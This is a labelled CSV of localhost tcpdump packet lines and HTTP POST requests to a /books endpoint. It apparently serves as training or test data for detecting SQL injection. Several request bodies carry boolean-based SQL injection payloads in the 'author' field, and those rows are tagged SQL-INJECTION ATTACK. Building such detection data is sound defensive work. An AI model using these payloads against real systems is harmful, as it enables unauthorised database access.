,raw_sql,predict_val
867,"17:27:19.327734 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43542 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x095c), seq 234, ack 239, win 350, options [nop,nop,TS val 2253399 ecr 2253399], length 0",VALID-REQUEST
868,"17:27:19.328131 IP6 (hlim 64, next-header TCP (6) payload length: 37) ::1.8080 > ::1.43542: Flags [P.], cksum 0x002d (incorrect -> 0xc533), seq 239:244, ack 234, win 350, options [nop,nop,TS val 2253400 ecr 2253399], length 5: HTTP",VALID-REQUEST
869,"17:27:19.328147 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43542 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x0955), seq 234, ack 244, win 350, options [nop,nop,TS val 2253400 ecr 2253400], length 0",VALID-REQUEST
870,"17:27:19.328643 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43542 > ::1.8080: Flags [F.], cksum 0x0028 (incorrect -> 0x0954), seq 234, ack 244, win 350, options [nop,nop,TS val 2253400 ecr 2253400], length 0",VALID-REQUEST
871,"17:27:19.330184 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43542: Flags [F.], cksum 0x0028 (incorrect -> 0x0951), seq 244, ack 235, win 350, options [nop,nop,TS val 2253402 ecr 2253400], length 0",VALID-REQUEST
872,"17:27:19.330204 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43542 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x094f), seq 235, ack 245, win 350, options [nop,nop,TS val 2253402 ecr 2253402], length 0",VALID-REQUEST
873,"17:27:19.340361 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.43544 > ::1.8080: Flags [S], cksum 0x0030 (incorrect -> 0x1a6a), seq 1728837022, win 43690, options [mss 65476,sackOK,TS val 2253412 ecr 0,nop,wscale 7], length 0",VALID-REQUEST
874,"17:27:19.340392 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.8080 > ::1.43544: Flags [S.], cksum 0x0030 (incorrect -> 0xf5bc), seq 3904493915, ack 1728837023, win 43690, options [mss 65476,sackOK,TS val 2253412 ecr 2253412,nop,wscale 7], length 0",VALID-REQUEST
875,"17:27:19.340411 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43544 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xc7ee), seq 1, ack 1, win 342, options [nop,nop,TS val 2253412 ecr 2253412], length 0",VALID-REQUEST
876,"17:27:19.340498 IP6 (hlim 64, next-header TCP (6) payload length: 265) ::1.43544 > ::1.8080: Flags [P.], cksum 0x0111 (incorrect -> 0x7f6d), seq 1:234, ack 1, win 342, options [nop,nop,TS val 2253412 ecr 2253412], length 233: HTTP, length: 233",VALID-REQUEST
877,POST /books HTTP/1.1,VALID-REQUEST
878,User-Agent: curl/7.29.0,VALID-REQUEST
879,Host: localhost:8080,VALID-REQUEST
880,Accept: */*,VALID-REQUEST
881,Content-type:application/json,VALID-REQUEST
882,Content-Length: 98,VALID-REQUEST
883,"{""name"":""Hackathon-Demo16"",""author"":""Ramesh' WHERE 5527=5527 AND 3428=3428-- QxBN"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
884,"17:27:19.340512 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43544: Flags [.], cksum 0x0028 (incorrect -> 0xc6fd), seq 1, ack 234, win 350, options [nop,nop,TS val 2253412 ecr 2253412], length 0",VALID-REQUEST
885,"17:27:19.345323 IP6 (hlim 64, next-header TCP (6) payload length: 270) ::1.8080 > ::1.43544: Flags [P.], cksum 0x0116 (incorrect -> 0xf4f3), seq 1:239, ack 234, win 350, options [nop,nop,TS val 2253417 ecr 2253412], length 238: HTTP, length: 238",VALID-REQUEST
886,HTTP/1.1 201,VALID-REQUEST
887,Content-Type: application/json;charset=UTF-8,VALID-REQUEST
888,Transfer-Encoding: chunked,VALID-REQUEST
889,"Date: Thu, 27 Jun 2019 17:27:19 GMT",VALID-REQUEST
890,68,VALID-REQUEST
891,"{""id"":22,""name"":""Hackathon-Demo16"",""author"":""Ramesh' WHERE 5527=5527 AND 3428=3428-- QxBN"",""price"":9.99}",SQL-INJECTION ATTACK
892,"17:27:19.345339 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43544 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xc605), seq 234, ack 239, win 350, options [nop,nop,TS val 2253417 ecr 2253417], length 0",VALID-REQUEST
893,"17:27:19.345679 IP6 (hlim 64, next-header TCP (6) payload length: 37) ::1.8080 > ::1.43544: Flags [P.], cksum 0x002d (incorrect -> 0x81de), seq 239:244, ack 234, win 350, options [nop,nop,TS val 2253417 ecr 2253417], length 5: HTTP",VALID-REQUEST
894,"17:27:19.345693 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43544 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xc600), seq 234, ack 244, win 350, options [nop,nop,TS val 2253417 ecr 2253417], length 0",VALID-REQUEST
895,"17:27:19.346093 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43544 > ::1.8080: Flags [F.], cksum 0x0028 (incorrect -> 0xc5fe), seq 234, ack 244, win 350, options [nop,nop,TS val 2253418 ecr 2253417], length 0",VALID-REQUEST
896,"17:27:19.350142 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43544: Flags [F.], cksum 0x0028 (incorrect -> 0xc5f8), seq 244, ack 235, win 350, options [nop,nop,TS val 2253422 ecr 2253418], length 0",VALID-REQUEST
897,"17:27:19.350164 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43544 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xc5f4), seq 235, ack 245, win 350, options [nop,nop,TS val 2253422 ecr 2253422], length 0",VALID-REQUEST
898,"17:27:19.357907 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.43546 > ::1.8080: Flags [S], cksum 0x0030 (incorrect -> 0x5e44), seq 247204352, win 43690, options [mss 65476,sackOK,TS val 2253430 ecr 0,nop,wscale 7], length 0",VALID-REQUEST
899,"17:27:19.357933 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.8080 > ::1.43546: Flags [S.], cksum 0x0030 (incorrect -> 0xeee7), seq 3803720186, ack 247204353, win 43690, options [mss 65476,sackOK,TS val 2253430 ecr 2253430,nop,wscale 7], length 0",VALID-REQUEST
900,"17:27:19.357952 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43546 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xc119), seq 1, ack 1, win 342, options [nop,nop,TS val 2253430 ecr 2253430], length 0",VALID-REQUEST
901,"17:27:19.358041 IP6 (hlim 64, next-header TCP (6) payload length: 261) ::1.43546 > ::1.8080: Flags [P.], cksum 0x010d (incorrect -> 0xec80), seq 1:230, ack 1, win 342, options [nop,nop,TS val 2253430 ecr 2253430], length 229: HTTP, length: 229",VALID-REQUEST
902,POST /books HTTP/1.1,VALID-REQUEST
903,User-Agent: curl/7.29.0,VALID-REQUEST
904,Host: localhost:8080,VALID-REQUEST
905,Accept: */*,VALID-REQUEST
906,Content-type:application/json,VALID-REQUEST
907,Content-Length: 94,VALID-REQUEST
908,"{""name"":""Hackathon-Demo17"",""author"":""Ramesh') AND 3428=3428 AND ('QGry'='QGry"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
909,"17:27:19.358055 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43546: Flags [.], cksum 0x0028 (incorrect -> 0xc02c), seq 1, ack 230, win 350, options [nop,nop,TS val 2253430 ecr 2253430], length 0",VALID-REQUEST
910,"17:27:19.362992 IP6 (hlim 64, next-header TCP (6) payload length: 266) ::1.8080 > ::1.43546: Flags [P.], cksum 0x0112 (incorrect -> 0xd299), seq 1:235, ack 230, win 350, options [nop,nop,TS val 2253435 ecr 2253430], length 234: HTTP, length: 234",VALID-REQUEST
911,HTTP/1.1 201,VALID-REQUEST
912,Content-Type: application/json;charset=UTF-8,VALID-REQUEST
913,Transfer-Encoding: chunked,VALID-REQUEST
914,"Date: Thu, 27 Jun 2019 17:27:19 GMT",VALID-REQUEST
915,64,VALID-REQUEST
916,"{""id"":23,""name"":""Hackathon-Demo17"",""author"":""Ramesh') AND 3428=3428 AND ('QGry'='QGry"",""price"":9.99}",SQL-INJECTION ATTACK
917,"17:27:19.363007 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43546 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xbf38), seq 230, ack 235, win 350, options [nop,nop,TS val 2253435 ecr 2253435], length 0",VALID-REQUEST
918,"17:27:19.363358 IP6 (hlim 64, next-header TCP (6) payload length: 37) ::1.8080 > ::1.43546: Flags [P.], cksum 0x002d (incorrect -> 0x7b11), seq 235:240, ack 230, win 350, options [nop,nop,TS val 2253435 ecr 2253435], length 5: HTTP",VALID-REQUEST
919,"17:27:19.363372 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43546 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xbf33), seq 230, ack 240, win 350, options [nop,nop,TS val 2253435 ecr 2253435], length 0",VALID-REQUEST
920,"17:27:19.366237 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43546 > ::1.8080: Flags [F.], cksum 0x0028 (incorrect -> 0xbf2f), seq 230, ack 240, win 350, options [nop,nop,TS val 2253438 ecr 2253435], length 0",VALID-REQUEST
921,"17:27:19.367729 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43546: Flags [F.], cksum 0x0028 (incorrect -> 0xbf2a), seq 240, ack 231, win 350, options [nop,nop,TS val 2253439 ecr 2253438], length 0",VALID-REQUEST
922,"17:27:19.367745 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43546 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xbf29), seq 231, ack 241, win 350, options [nop,nop,TS val 2253439 ecr 2253439], length 0",VALID-REQUEST
923,"17:27:19.379549 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.43548 > ::1.8080: Flags [S], cksum 0x0030 (incorrect -> 0x3e06), seq 1839516478, win 43690, options [mss 65476,sackOK,TS val 2253451 ecr 0,nop,wscale 7], length 0",VALID-REQUEST
924,"17:27:19.379592 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.8080 > ::1.43548: Flags [S.], cksum 0x0030 (incorrect -> 0xc0c4), seq 3213056767, ack 1839516479, win 43690, options [mss 65476,sackOK,TS val 2253451 ecr 2253451,nop,wscale 7], length 0",VALID-REQUEST
925,"17:27:19.379640 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43548 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x92f6), seq 1, ack 1, win 342, options [nop,nop,TS val 2253451 ecr 2253451], length 0",VALID-REQUEST
926,"17:27:19.379728 IP6 (hlim 64, next-header TCP (6) payload length: 266) ::1.43548 > ::1.8080: Flags [P.], cksum 0x0112 (incorrect -> 0x3e8d), seq 1:235, ack 1, win 342, options [nop,nop,TS val 2253451 ecr 2253451], length 234: HTTP, length: 234",VALID-REQUEST
927,POST /books HTTP/1.1,VALID-REQUEST
928,User-Agent: curl/7.29.0,VALID-REQUEST
929,Host: localhost:8080,VALID-REQUEST
930,Accept: */*,VALID-REQUEST
931,Content-type:application/json,VALID-REQUEST
932,Content-Length: 99,VALID-REQUEST
933,"{""name"":""Hackathon-Demo18"",""author"":""Ramesh') AND 3428=3428 AND ('aSyd' LIKE 'aSyd"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
934,"17:27:19.379740 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43548: Flags [.], cksum 0x0028 (incorrect -> 0x9204), seq 1, ack 235, win 350, options [nop,nop,TS val 2253451 ecr 2253451], length 0",VALID-REQUEST
935,"17:27:19.384883 IP6 (hlim 64, next-header TCP (6) payload length: 271) ::1.8080 > ::1.43548: Flags [P.], cksum 0x0117 (incorrect -> 0xc5fd), seq 1:240, ack 235, win 350, options [nop,nop,TS val 2253457 ecr 2253451], length 239: HTTP, length: 239",VALID-REQUEST
936,HTTP/1.1 201,VALID-REQUEST
937,Content-Type: application/json;charset=UTF-8,VALID-REQUEST
938,Transfer-Encoding: chunked,VALID-REQUEST
939,"Date: Thu, 27 Jun 2019 17:27:19 GMT",VALID-REQUEST
940,69,VALID-REQUEST
941,"{""id"":24,""name"":""Hackathon-Demo18"",""author"":""Ramesh') AND 3428=3428 AND ('aSyd' LIKE 'aSyd"",""price"":9.99}",SQL-INJECTION ATTACK
942,"17:27:19.384901 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43548 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x9109), seq 235, ack 240, win 350, options [nop,nop,TS val 2253457 ecr 2253457], length 0",VALID-REQUEST
943,"17:27:19.385286 IP6 (hlim 64, next-header TCP (6) payload length: 37) ::1.8080 > ::1.43548: Flags [P.], cksum 0x002d (incorrect -> 0x4ce2), seq 240:245, ack 235, win 350, options [nop,nop,TS val 2253457 ecr 2253457], length 5: HTTP",VALID-REQUEST
944,"17:27:19.385300 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43548 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x9104), seq 235, ack 245, win 350, options [nop,nop,TS val 2253457 ecr 2253457], length 0",VALID-REQUEST
945,"17:27:19.389338 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43548 > ::1.8080: Flags [F.], cksum 0x0028 (incorrect -> 0x90ff), seq 235, ack 245, win 350, options [nop,nop,TS val 2253461 ecr 2253457], length 0",VALID-REQUEST
946,"17:27:19.390863 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43548: Flags [F.], cksum 0x0028 (incorrect -> 0x90f9), seq 245, ack 236, win 350, options [nop,nop,TS val 2253462 ecr 2253461], length 0",VALID-REQUEST
947,"17:27:19.390881 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43548 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x90f7), seq 236, ack 246, win 350, options [nop,nop,TS val 2253463 ecr 2253462], length 0",VALID-REQUEST
948,"17:27:19.400019 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.43550 > ::1.8080: Flags [S], cksum 0x0030 (incorrect -> 0xd900), seq 3790322661, win 43690, options [mss 65476,sackOK,TS val 2253472 ecr 0,nop,wscale 7], length 0",VALID-REQUEST
949,"17:27:19.400050 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.8080 > ::1.43550: Flags [S.], cksum 0x0030 (incorrect -> 0x1d24), seq 2056838768, ack 3790322662, win 43690, options [mss 65476,sackOK,TS val 2253472 ecr 2253472,nop,wscale 7], length 0",VALID-REQUEST
950,"17:27:19.400072 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43550 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xef55), seq 1, ack 1, win 342, options [nop,nop,TS val 2253472 ecr 2253472], length 0",VALID-REQUEST
951,"17:27:19.400158 IP6 (hlim 64, next-header TCP (6) payload length: 250) ::1.43550 > ::1.8080: Flags [P.], cksum 0x0102 (incorrect -> 0x7758), seq 1:219, ack 1, win 342, options [nop,nop,TS val 2253472 ecr 2253472], length 218: HTTP, length: 218",VALID-REQUEST
952,POST /books HTTP/1.1,VALID-REQUEST
953,User-Agent: curl/7.29.0,VALID-REQUEST
954,Host: localhost:8080,VALID-REQUEST
955,Accept: */*,VALID-REQUEST
956,Content-type:application/json,VALID-REQUEST
957,Content-Length: 83,VALID-REQUEST
958,"{""name"":""Hackathon-Demo19"",""author"":""Ramesh') AND 3428=3428-- gvQa"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
959,"17:27:19.400171 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43550: Flags [.], cksum 0x0028 (incorrect -> 0xee73), seq 1, ack 219, win 350, options [nop,nop,TS val 2253472 ecr 2253472], length 0",VALID-REQUEST
960,"17:27:19.405425 IP6 (hlim 64, next-header TCP (6) payload length: 255) ::1.8080 > ::1.43550: Flags [P.], cksum 0x0107 (incorrect -> 0x7e53), seq 1:224, ack 219, win 350, options [nop,nop,TS val 2253477 ecr 2253472], length 223: HTTP, length: 223",VALID-REQUEST
961,HTTP/1.1 201,VALID-REQUEST
962,Content-Type: application/json;charset=UTF-8,VALID-REQUEST
963,Transfer-Encoding: chunked,VALID-REQUEST
964,"Date: Thu, 27 Jun 2019 17:27:19 GMT",VALID-REQUEST
965,59,VALID-REQUEST
966,"{""id"":25,""name"":""Hackathon-Demo19"",""author"":""Ramesh') AND 3428=3428-- gvQa"",""price"":9.99}",SQL-INJECTION ATTACK
967,"17:27:19.405441 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43550 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xed8a), seq 219, ack 224, win 350, options [nop,nop,TS val 2253477 ecr 2253477], length 0",VALID-REQUEST
968,"17:27:19.405800 IP6 (hlim 64, next-header TCP (6) payload length: 37) ::1.8080 > ::1.43550: Flags [P.], cksum 0x002d (incorrect -> 0xa963), seq 224:229, ack 219, win 350, options [nop,nop,TS val 2253477 ecr 2253477], length 5: HTTP",VALID-REQUEST
969,"17:27:19.405816 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43550 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xed85), seq 219, ack 229, win 350, options [nop,nop,TS val 2253477 ecr 2253477], length 0",VALID-REQUEST
970,"17:27:19.413112 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43550 > ::1.8080: Flags [F.], cksum 0x0028 (incorrect -> 0xed7c), seq 219, ack 229, win 350, options [nop,nop,TS val 2253485 ecr 2253477], length 0",VALID-REQUEST
971,"17:27:19.414688 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43550: Flags [F.], cksum 0x0028 (incorrect -> 0xed72), seq 229, ack 220, win 350, options [nop,nop,TS val 2253486 ecr 2253485], length 0",VALID-REQUEST
972,"17:27:19.414704 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43550 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xed71), seq 220, ack 230, win 350, options [nop,nop,TS val 2253486 ecr 2253486], length 0",VALID-REQUEST
973,"17:27:19.431058 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.43552 > ::1.8080: Flags [S], cksum 0x0030 (incorrect -> 0xbc5c), seq 3343381260, win 43690, options [mss 65476,sackOK,TS val 2253503 ecr 0,nop,wscale 7], length 0",VALID-REQUEST
974,"17:27:19.431087 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.8080 > ::1.43552: Flags [S.], cksum 0x0030 (incorrect -> 0xbb9b), seq 4119636033, ack 3343381261, win 43690, options [mss 65476,sackOK,TS val 2253503 ecr 2253503,nop,wscale 7], length 0",VALID-REQUEST
975,"17:27:19.431106 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43552 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x8dcd), seq 1, ack 1, win 342, options [nop,nop,TS val 2253503 ecr 2253503], length 0",VALID-REQUEST
976,"17:27:19.431199 IP6 (hlim 64, next-header TCP (6) payload length: 266) ::1.43552 > ::1.8080: Flags [P.], cksum 0x0112 (incorrect -> 0x24c5), seq 1:235, ack 1, win 342, options [nop,nop,TS val 2253503 ecr 2253503], length 234: HTTP, length: 234",VALID-REQUEST
977,POST /books HTTP/1.1,VALID-REQUEST
978,User-Agent: curl/7.29.0,VALID-REQUEST
979,Host: localhost:8080,VALID-REQUEST
980,Accept: */*,VALID-REQUEST
981,Content-type:application/json,VALID-REQUEST
982,Content-Length: 99,VALID-REQUEST
983,"{""name"":""Hackathon-Demo20"",""author"":""Ramesh') AND 6605=1377 AND ('JIdw' LIKE 'JIdw"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
984,"17:27:19.431212 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43552: Flags [.], cksum 0x0028 (incorrect -> 0x8cdb), seq 1, ack 235, win 350, options [nop,nop,TS val 2253503 ecr 2253503], length 0",VALID-REQUEST
985,"17:27:19.439188 IP6 (hlim 64, next-header TCP (6) payload length: 271) ::1.8080 > ::1.43552: Flags [P.], cksum 0x0117 (incorrect -> 0x21bc), seq 1:240, ack 235, win 350, options [nop,nop,TS val 2253511 ecr 2253503], length 239: HTTP, length: 239",VALID-REQUEST
986,HTTP/1.1 201,VALID-REQUEST
987,Content-Type: application/json;charset=UTF-8,VALID-REQUEST
988,Transfer-Encoding: chunked,VALID-REQUEST
989,"Date: Thu, 27 Jun 2019 17:27:19 GMT",VALID-REQUEST
990,69,VALID-REQUEST
991,"{""id"":26,""name"":""Hackathon-Demo20"",""author"":""Ramesh') AND 6605=1377 AND ('JIdw' LIKE 'JIdw"",""price"":9.99}",SQL-INJECTION ATTACK
992,"17:27:19.439206 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43552 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x8bdc), seq 235, ack 240, win 350, options [nop,nop,TS val 2253511 ecr 2253511], length 0",VALID-REQUEST
993,"17:27:19.439590 IP6 (hlim 64, next-header TCP (6) payload length: 37) ::1.8080 > ::1.43552: Flags [P.], cksum 0x002d (incorrect -> 0x47b5), seq 240:245, ack 235, win 350, options [nop,nop,TS val 2253511 ecr 2253511], length 5: HTTP",VALID-REQUEST
994,"17:27:19.439602 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43552 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x8bd7), seq 235, ack 245, win 350, options [nop,nop,TS val 2253511 ecr 2253511], length 0",VALID-REQUEST
995,"17:27:19.441463 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43552 > ::1.8080: Flags [F.], cksum 0x0028 (incorrect -> 0x8bd4), seq 235, ack 245, win 350, options [nop,nop,TS val 2253513 ecr 2253511], length 0",VALID-REQUEST
996,"17:27:19.445344 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43552: Flags [F.], cksum 0x0028 (incorrect -> 0x8bcd), seq 245, ack 236, win 350, options [nop,nop,TS val 2253517 ecr 2253513], length 0",VALID-REQUEST
997,"17:27:19.445361 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43552 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0x8bc9), seq 236, ack 246, win 350, options [nop,nop,TS val 2253517 ecr 2253517], length 0",VALID-REQUEST
998,"17:27:19.456020 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.43554 > ::1.8080: Flags [S], cksum 0x0030 (incorrect -> 0x5af0), seq 2176424428, win 43690, options [mss 65476,sackOK,TS val 2253528 ecr 0,nop,wscale 7], length 0",VALID-REQUEST
999,"17:27:19.456048 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.8080 > ::1.43554: Flags [S.], cksum 0x0030 (incorrect -> 0x0500), seq 553964000, ack 2176424429, win 43690, options [mss 65476,sackOK,TS val 2253528 ecr 2253528,nop,wscale 7], length 0",VALID-REQUEST
1000,"17:27:19.456065 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43554 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xd731), seq 1, ack 1, win 342, options [nop,nop,TS val 2253528 ecr 2253528], length 0",VALID-REQUEST
1001,"17:27:19.456148 IP6 (hlim 64, next-header TCP (6) payload length: 297) ::1.43554 > ::1.8080: Flags [P.], cksum 0x0131 (incorrect -> 0xa6d3), seq 1:266, ack 1, win 342, options [nop,nop,TS val 2253528 ecr 2253528], length 265: HTTP, length: 265",VALID-REQUEST
1002,POST /books HTTP/1.1,VALID-REQUEST
1003,User-Agent: curl/7.29.0,VALID-REQUEST
1004,Host: localhost:8080,VALID-REQUEST
1005,Accept: */*,VALID-REQUEST
1006,Content-type:application/json,VALID-REQUEST
1007,Content-Length: 129,VALID-REQUEST
1008,"{""name"":""Hackathon-Demo21"",""author"":""RameshSELECT CONCAT(0x717a786271,(SELECT (ELT(9500=9500,1))),0x7176767871))"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
1009,"17:27:19.456160 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43554: Flags [.], cksum 0x0028 (incorrect -> 0xd620), seq 1, ack 266, win 350, options [nop,nop,TS val 2253528 ecr 2253528], length 0",VALID-REQUEST
1010,"17:27:19.460834 IP6 (hlim 64, next-header TCP (6) payload length: 301) ::1.8080 > ::1.43554: Flags [P.], cksum 0x0135 (incorrect -> 0x2f4e), seq 1:270, ack 266, win 350, options [nop,nop,TS val 2253532 ecr 2253528], length 269: HTTP, length: 269",VALID-REQUEST
1011,HTTP/1.1 201,VALID-REQUEST
1012,Content-Type: application/json;charset=UTF-8,VALID-REQUEST
1013,Transfer-Encoding: chunked,VALID-REQUEST
1014,"Date: Thu, 27 Jun 2019 17:27:19 GMT",VALID-REQUEST
1015,87,VALID-REQUEST
1016,"{""id"":27,""name"":""Hackathon-Demo21"",""author"":""RameshSELECT CONCAT(0x717a786271,(SELECT (ELT(9500=9500,1))),0x7176767871))"",""price"":9.99}",SQL-INJECTION ATTACK
1017,"17:27:19.460867 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43554 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xd50a), seq 266, ack 270, win 350, options [nop,nop,TS val 2253533 ecr 2253532], length 0",VALID-REQUEST
1018,"17:27:19.461226 IP6 (hlim 64, next-header TCP (6) payload length: 37) ::1.8080 > ::1.43554: Flags [P.], cksum 0x002d (incorrect -> 0x90e2), seq 270:275, ack 266, win 350, options [nop,nop,TS val 2253533 ecr 2253533], length 5: HTTP",VALID-REQUEST
1019,"17:27:19.461244 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43554 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xd504), seq 266, ack 275, win 350, options [nop,nop,TS val 2253533 ecr 2253533], length 0",VALID-REQUEST
1020,"17:27:19.463461 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43554 > ::1.8080: Flags [F.], cksum 0x0028 (incorrect -> 0xd501), seq 266, ack 275, win 350, options [nop,nop,TS val 2253535 ecr 2253533], length 0",VALID-REQUEST
1021,"17:27:19.464273 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.8080 > ::1.43554: Flags [F.], cksum 0x0028 (incorrect -> 0xd4fd), seq 275, ack 267, win 350, options [nop,nop,TS val 2253536 ecr 2253535], length 0",VALID-REQUEST
1022,"17:27:19.464289 IP6 (hlim 64, next-header TCP (6) payload length: 32) ::1.43554 > ::1.8080: Flags [.], cksum 0x0028 (incorrect -> 0xd4fc), seq 267, ack 276, win 350, options [nop,nop,TS val 2253536 ecr 2253536], length 0",VALID-REQUEST
1023,"17:27:19.472630 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.43556 > ::1.8080: Flags [S], cksum 0x0030 (incorrect -> 0x57c9), seq 2935975867, win 43690, options [mss 65476,sackOK,TS val 2253544 ecr 0,nop,wscale 7], length 0",VALID-REQUEST
1024,"17:27:19.472660 IP6 (hlim 64, next-header TCP (6) payload length: 40) ::1.8080 > ::1.43556: Flags [S.], cksum 0x0030 (incorrect -> 0xe358), seq 1944427887, ack 2935975868, win 43690, options [mss 65476,sackOK,TS val 2253544 ecr 2253544,nop,wscale 7], length 0",VALID-REQUEST
